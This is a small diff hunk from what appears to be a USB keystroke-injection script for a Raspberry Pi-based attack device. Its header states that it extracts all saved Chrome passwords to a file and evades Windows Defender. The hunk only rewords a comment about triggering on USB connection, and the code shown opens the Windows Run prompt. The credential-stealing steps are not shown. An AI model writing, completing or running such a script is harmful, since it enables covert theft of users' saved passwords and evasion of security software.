@@ -1,7 +1,7 @@
 // Use this script to download all passwords from Chrome and output them to a .txt file on the user's desktop.
 // Evades Windows Defender. Requires an admin to be logged in and UAC prompts without passwords.
 
-//waitLED(ANY_OR_NONE) // uncomment if running on USB connection
+//waitLED(ANY_OR_NONE) // if script is triggered on USB connection, this line waits until the Pi is connected sucessfully to the computer
 layout("us")
 press("WIN R") // open Run prompt
 delay(500)
